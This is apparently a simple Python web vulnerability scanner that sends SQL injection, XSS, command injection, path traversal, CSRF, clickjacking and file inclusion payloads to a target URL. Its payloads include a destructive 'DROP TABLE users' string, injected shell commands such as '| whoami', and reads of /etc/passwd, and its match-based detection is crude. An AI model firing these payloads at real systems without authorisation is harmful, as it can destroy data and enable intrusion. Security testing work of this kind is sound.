import requests
from bs4 import BeautifulSoup

def test_sql_injection(url):
    payloads = ["' OR '1'='1", "' OR 1=1--", "'; DROP TABLE users; --"]
    for payload in payloads:
        test_url = f"{url}?input={payload}"
        response = requests.get(test_url)
        if "SQL syntax" in response.text or "database error" in response.text:
            print(f"SQL Injection Vulnerability Found: {test_url}")

def test_xss(url):
    payloads = ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>"]
    for payload in payloads:
        test_url = f"{url}?input={payload}"
        response = requests.get(test_url)
        if payload in response.text:
            print(f"XSS Vulnerability Found: {test_url}")

def test_command_injection(url):
    payloads = ["; ls", "| ls", "| whoami", "| id"]
    for payload in payloads:
        test_url = f"{url}?input={payload}"
        response = requests.get(test_url)
        if "root" in response.text or "bin" in response.text:
            print(f"Command Injection Vulnerability Found: {test_url}")

def test_path_traversal(url):
    payloads = ["../../../../etc/passwd", "..\\..\\..\\..\\Windows\\System32\\drivers\\etc\\hosts"]
    for payload in payloads:
        test_url = f"{url}?file={payload}"
        response = requests.get(test_url)
        if "root" in response.text or "passwd" in response.text:
            print(f"Path Traversal Vulnerability Found: {test_url}")

def test_csrf(url):
    payload = {
        "username": "attacker",
        "password": "newpassword",
        "csrf_token": "malicious_token"
    }
    
    test_url = f"{url}/change-password"
    response = requests.post(test_url, data=payload)

    if "Password changed successfully" in response.text:
        print(f"CSRF Vulnerability Found: {test_url}")


def test_clickjacking(url):
    payload = '<iframe src="http://example.com" style="width:100%; height:100%;"></iframe>'
    test_url = f"{url}?input={payload}"
    response = requests.get(test_url)
    if payload in response.text:
        print(f"Clickjacking Vulnerability Found: {test_url}")

def test_lfi(url):
    payloads = ["../../../../etc/passwd", "../../../../var/log/syslog"]
    for payload in payloads:
        test_url = f"{url}?file={payload}"
        response = requests.get(test_url)
        if "root" in response.text or "passwd" in response.text:
            print(f"Local File Inclusion Vulnerability Found: {test_url}")
